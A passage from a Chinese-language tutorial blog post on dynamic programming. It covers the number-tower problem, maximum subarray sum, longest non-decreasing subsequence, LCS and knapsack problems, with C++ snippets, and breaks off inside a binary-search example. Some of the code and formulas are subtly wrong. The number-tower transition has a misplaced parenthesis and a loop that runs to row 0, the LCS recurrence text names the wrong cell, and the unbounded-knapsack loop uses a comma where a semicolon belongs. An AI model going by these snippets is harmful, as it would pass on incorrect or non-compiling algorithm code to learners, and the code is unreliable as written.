(2,2) 到达最底层的最大和 dp [2][2], 即进行了以此决策：走数字 5 的左下还是右下。写出式子就是： <code>dp[1][1]=max(dp[2][1],dp[2][2])+f[1][1]</code>  由此可以打的这么一个信息，如果要求出 dp [i][j]，那么一定要先求出它的两个子问题。即 <code>dp[i][j]=max(dp[i+1][j],dp[i+1][j+1])+f[i][j]</code> 。把 dp [i][j] 称为问题的<strong>状态</strong>，而把上面的式子称为<strong>状态转移方程</strong>。<br>下面根据这种思想写出动态规划的代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> f[maxn][maxn],dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;f[i][j]); <span class="comment">//输入数塔</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j&lt;= n;j++)&#123;</span><br><span class="line">dp[n][j] = f[n][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =n - <span class="number">1</span>; i &gt;- <span class="number">1</span>; i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>; j &lt;= i; j++)&#123;</span><br><span class="line">dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j],dp[i+<span class="number">1</span>][j+<span class="number">1</span>]+f[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,dp[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，使用递归也可以实现上面的例子 (即从 dp [1][1] 开始递归，直至到达边界时返回结果)。二者的区别在于：使用<strong>递推写法</strong>的计算方式是<strong>自底向上</strong>，即从边界开始，不断向上解决问题，直到解决了目标问题：而使用<strong>递归写法</strong>的计算方式是<strong>自顶向下</strong>，即从目标问题开始，将它分解成子问题的组合，直到分解到边界为止。通过上面的例子再引申一个概念：如果一个问题的最优解可以由其子问题的最优解有效地构造出来，那么称这个问题拥有<strong>最优子结构</strong>。最优子结构保证了动态规划中原问题的最优解可以由子问题的最优解推导而来。因此，一个问题必须拥有最优子结构，才能使用动态规划去解决。<strong>即，一个问题必须拥有重叠子问题和最优子结构，才能使用动态规划去解决</strong>。<br>①：分治和动态规划。分治和动态规划都是将问题分解为子问题，然后合并子问题的解得到原问题的解。但是不同的是，分治法分解出的子问题是不重叠的，因此分治法解决的问题不拥有重叠子问题，二动态规划解决的问题拥有重叠子问题。例如：归并排序和快速排序都是分别处理左序列和右序列，然后将左右序列的结果合并，过程中不出现重叠子问题，因此，它们使用的都是分治法。另外，分治法解决的问题不一定是最优化问题，而动态规划解决的问题是最优化问题。<br>②：贪心和动态规划。贪心和动态规划都要求原问题必须拥有最优子结构。二者的区别在于，贪心法采用的计算方式类似上面介绍的 “自顶向下”。但是并不等待子问题求解完毕后在选择使用哪一个，而是通过一种策略直接选择一个子问题去求解，没被选择的子问题就不去求解了，直接抛弃。也就是说，它总是在上一步选择的基础上继续选择，因此整个过程以一种单链的流水方式进行，</p><h4 id="最大连续子序列和"><a class="markdownIt-Anchor" href="#最大连续子序列和">#</a> 最大连续子序列和</h4><p>问题如下： 给定一个数字序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 求 i，j 使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>+…+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">A_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 最大，输出这个最大的和。<br>这个问题可以用暴力，就是直接枚举左右端点 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>) 的复杂度，而计算 A [i] - A [j] 需要 O (n) 复杂度因此总复杂度较高。下面介绍动态规划的做法，复杂度仅为 O (n)。<br><strong>步骤 1：</strong> 令状态 dp [i] 表示以 A [i] 作为末尾的连续序列的最大和。以样例为例子：序列 - 2 11 -4 13 -5 -2, 下标分别记为 0,1,2,3,4,5, 那么：<br> <code>dp[0]=-2,dp[1]=11,dp[2]=7(11-4),dp[3]=20,dp[4]=15,dp[5]=13</code>  通过设置这么一个 dp 数组，要求的最大和其实就是 dp [0]–dp [n-1] 中的最大值。下面解释如何求解 dp 数组。<br><strong>步骤 2</strong>：作如下考虑：因为 dp [i] 要求是必须以 A [i] 结尾的连续序列，那么有两种情况：<br>①：这个最大和的连续序列只有一个元素，即以 A [i] 开始，A [i] 结尾。<br>②：这个最大和的连续序列有多个元素，即从前面某处 A [p] 开始 (p&lt;i), 一直到 A [i] 结尾。<br>第一种情况，最大和就是 A [i] 本身。<br>第二种情况，最大和是 dp [i-1]+A [i] 由此可以得到状态转移方程:<br><strong>dp[i] = max{A[i], dp[i-1] + A[i]}</strong></p><h4 id="最长不下降子序列lis"><a class="markdownIt-Anchor" href="#最长不下降子序列lis">#</a> 最长不下降子序列 (LIS)</h4><blockquote><p>在一个数字序列中，找到一个最长的子序列（可以不连续），使得这个子序列是不下降的。</p></blockquote><p>例如，现在有序列 A = {1,2,3,-1,-2,7,9}(下标从 1 开始)，它的最长不下降子序列是 {1,2,3,7,9}, 长度为 5. 另外，还有一些子序列是不下降子序列，比如 {1,2,3},{-2,7,9} 等，但都不是最长的。<br>其实这个问题很容易想到也可以直接暴力求解，直接对所有情况进行枚举，但是其复杂度显然很高。我们仍利用 dp [i] 数组来进行辅助记录。如果令 dp [i] 表示以 A [i] 结尾的最长不下降子序列长度。这样对 A [i] 来说就会有两种可能:<br>①：如果存在 A [i] 之前的元素 A [j](j&lt;i)，使得 A [j]&lt;=A [i] 且 dp [j]+1 &gt; dp [i]，那么就把 A [i] 跟在以 A [j] 结尾的 LIS 后面，形成一条更长的不下降子序列。<br>②：如果 A [i] 之前的元素都比 A [i] 大，那么 A [i] 就只好自己形成一条 LIX，但是长度为 1，即这个子序列里面只有一个 A [i]。<br>因此可以写出状态转移方程：   <strong>dp[i] = max{1,dp[j] + 1}</strong><br> 由此可以写出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> A[N],dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt; i ;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i] &gt;= A[j] &amp;&amp; (dp[j] + <span class="number">1</span> &gt; dp[i]))&#123;</span><br><span class="line">dp[i] = dp[j] +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(ans,dp[i]);</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述算法的时间复杂度为 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>)，但事实上有 O (n Logn) 的做法。<br>将原来的 dp 数组的存储由数值换成<strong>该序列中，上升子序列长度为 i 的上升子序列的最小末尾数值</strong>，这其实就是一种几近贪心的思想：我们当前上升子序列长度如果已经确定，那么<strong>如果这种长度的子序列的结尾元素越小，后面的元素就可以更方便地加入到这条我们臆测地，可作为结果地上升子序列之中</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;a[i];</span><br><span class="line">f[i]=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="comment">//初始值要设为INF</span></span><br><span class="line"><span class="comment">/*原因很简单，每遇到一个新的元素时，就跟已经记录的f数组当前所记录的最长</span></span><br><span class="line"><span class="comment">上升子序列的末尾元素相比较：如果小于此元素，那么就不断向前找，直到找到</span></span><br><span class="line"><span class="comment">一个刚好比它大的元素，替换；反之如果大于，么填到末尾元素的下一个q，INF</span></span><br><span class="line"><span class="comment">                就是为了方便向后替换啊！*/</span> </span><br><span class="line">&#125;</span><br><span class="line">f[<span class="number">1</span>]=a[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> len=<span class="number">1</span>;<span class="comment">//通过记录f数组的有效位数，求得个数 </span></span><br><span class="line"><span class="comment">/*因为上文中所提到我们有可能要不断向前寻找，</span></span><br><span class="line"><span class="comment">所以可以采用二分查找的策略，这便是将时间复杂</span></span><br><span class="line"><span class="comment">    度降成nlogn级别的关键因素。*/</span> </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> l=<span class="number">0</span>,r=len,mid;</span><br><span class="line"><span class="keyword">if</span>(a[i]&gt;f[len])f[++len]=a[i];</span><br><span class="line"><span class="comment">//如果刚好大于末尾，暂时向后顺次填充 </span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(l&lt;r)</span><br><span class="line">&#123;</span><br><span class="line">    mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(f[mid]&gt;a[i])r=mid;</span><br><span class="line"><span class="comment">//如果仍然小于之前所记录的最小末尾，那么不断</span></span><br><span class="line"><span class="comment">//向前寻找(因为是最长上升子序列，所以f数组必</span></span><br><span class="line"><span class="comment">//然满足单调) </span></span><br><span class="line"><span class="keyword">else</span> l=mid+<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line">f[l]=<span class="built_in">min</span>(a[i],f[l]);<span class="comment">//更新最小末尾 </span></span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;len;</span><br></pre></td></tr></table></figure><h4 id="最长公共子序列-lcs"><a class="markdownIt-Anchor" href="#最长公共子序列-lcs">#</a> 最长公共子序列 （LCS）</h4><p>题目描述： 给定两个字符串 A 和 B，求一个字符串，使得这个字符串是 A 和 B 的最长公共部分（子序列可以不连续）<br>这里令 dp [i][j] 表示字符串 A 的 i 号位和字符串 B 的 j 号位之前的 LCS 长度，那么可以根据 A [i] 和 B [j] 的情况，分为两种决策：<br>①若 A [i] == B [j]，则字符串 A 和 字符串 B 的 LCS 增加了 1 位，即有 dp [i][j] = dp [i-1][j-1]+1。<br>②若 A [i] != B [i]，则字符串 A 的 i 号位和字符串 B 的 j 号位之前的 LCS 无法延长，因此 dp [i][j] 将会继承 dp [i-1][j] 与 dp [i][j] 中较大的值，即有 dp [i][j] = max {dp [i-1][j],dp [i][j-1]}。</p><h2 id="背包问题"><a class="markdownIt-Anchor" href="#背包问题">#</a> 背包问题</h2><p>背包问题是一类很经典的动态规划问题，这里先介绍两个最简单的背包问题：0-1 背包问题和完全背包问题。</p><h4 id="01背包问题"><a class="markdownIt-Anchor" href="#01背包问题">#</a> 01 背包问题</h4><blockquote><p>题目描述：有 n 件物品，每件物品的重量为 w [i]，价值为 c [i]。现有一个容量为 V 的背包，问如何选取物品放入背包，使得背包内物品的总价值最大。其中每种物品都只有 1 件。</p></blockquote><p>这里引入 dp [i][v] 表示前 i 件物品恰好装入容量为 v 的背包中所获得的最大值。下面介绍如何求解 dp 数组。<br>考虑对第 i 件物品有两种选择策略：<br>①不放第 i 件物品，那么问题转化为前 i-1 件物品恰好装入容量为 v 的背包中所能获得的最大价值，也即 dp [i-1][v]。<br>②放第 i 件物品，那么问题转化为前 i-1 件物品恰好装入容量 v-w [i] 的背包中所能获得的最大价值，也即 dp [i-1][v-w [i]]+c [i]。<br>由上述两种策略，且要获得最大价值，有下面状态转移方程<strong> dp [i][v] = max {dp [i-1][v],dp [i-1][v-w [i]]+c [i]}</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = w[i]; v&lt;= V;v++)&#123;</span><br><span class="line">dp[i][v] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][v],dp[i<span class="number">-1</span>][v-w[i]]+c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，可以对空间进行优化，可以将其化简为<strong> dp [v] = max (dp [v],dp [v-w [i]]+c [i])。</strong> 不过这样写需要更改循环代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = V; v&gt;=w[i];v--)&#123;</span><br><span class="line">dp[v] = <span class="built_in">max</span>(dp[v],dp[v-w[i]]+c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完全背包问题"><a class="markdownIt-Anchor" href="#完全背包问题">#</a> 完全背包问题</h4><blockquote><p>描述如下：有 n 种物品，每种物品的重量为 w [i]，价值为 c [i]。现有一个容量为 V 的背包，问如何选取物品放入背包，使得背包内物品的总价值最大。每种物品都有无穷件。</p></blockquote><p>可以看出，完全背包问题和 01 背包问题唯一的区别就在于：完全背包的物品数量每种有无穷件，选取物品时对每一件物品可以取多件。同样令 dp [i][v] 表示前 i 件物品恰好放入容量为 v 的背包中能获得的最大价值。对第 i 件物品来说：<br>①不放第 i 件物品，那么 dp [i][v]=dp [i-1][v]，这跟 01 背包是一样的。<br>②放第 i 件物品。这里的处理和 01 背包有所不同，因为 01 背包的每个物品只能选择一个，因此选择放第 i 件物品就意味着必须转移到 dp [i-1][v-w [i]] 这个状态；但是完全背包不同，完全背包如果选择放第 i 件物品之后并不是转移到 dp [i-1][v-w [i]]，而是转移到 dp [i][v-w [i]] 这个状态，因为每件物品都可以放任意件，放了第 i 件物品之后还可以继续放第 i 件物品，直到第二维的 v-w [i] 无法保持大于等于 0 为止。<br>由上面的分析可以写出状态转移方程： <code>dp[i][v] = max(dp[i-1][v],dp[i][v-w[i]]+c[i])</code> 。<br>写成一维形式之后和 01 背包完全相同，唯一的区别是这里的 v 的枚举顺序是<strong>正向枚举</strong>，而 01 背包的一维形式中必须 v 是逆向枚举。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v  = w[i], v &lt;= V; v++)&#123;</span><br><span class="line">dp[v] = <span class="built_in">max</span>(dp[v],dp[v-w[i]]+c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="状态压缩dp"><a class="markdownIt-Anchor" href="#状态压缩dp">#</a> 状态压缩 DP</h2><p>这里讲一个之前某蓝桥杯用到的算法，虽然很容易爆内存，但是有些实在没有思路的题可能用一下也是可以的。</p><h1 id="扩展的一些算法或者数据结构"><a class="markdownIt-Anchor" href="#扩展的一些算法或者数据结构">#</a> 扩展的一些算法或者数据结构</h1><h3 id="排序"><a class="markdownIt-Anchor" href="#排序">#</a> 排序</h3><h5 id="归并排序"><a class="markdownIt-Anchor" href="#归并排序">#</a> 归并排序</h5><p>思路参考：<a href="https://blog.csdn.net/justidle/article/details/104203958?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170246155316800226572031%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170246155316800226572031&amp;biz_id=0&amp;spm=1018.2226.3001.4187">排序 —— 归并排序（Merge sort）-CSDN 博客</a><br>直接</p><h3 id="二分"><a class="markdownIt-Anchor" href="#二分">#</a> 二分</h3><h4 id="二分查找"><a class="markdownIt-Anchor" href="#二分查找">#</a> 二分查找</h4><p>首先肯定是最经典的 <strong>从有序数组中查找某个值</strong>。</p><blockquote><p>给定长度为 n 的单调不下降数列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span> 和一个数 k，求满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> &gt;= k 条件的最小 i。不存在的情况下输出 n。</p></blockquote><p>当然，可以朴素地按照顺序逐个查找。但是如果利用二分地算法可以降低到 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">log_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) 的时间复杂度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"><span class="type">int</span> a[MAX_N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> lb = <span class="number">-1</span>, ub =n;</span><br><span class="line"><span class="keyword">while</span>(ub - lb &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> mid = (lb + 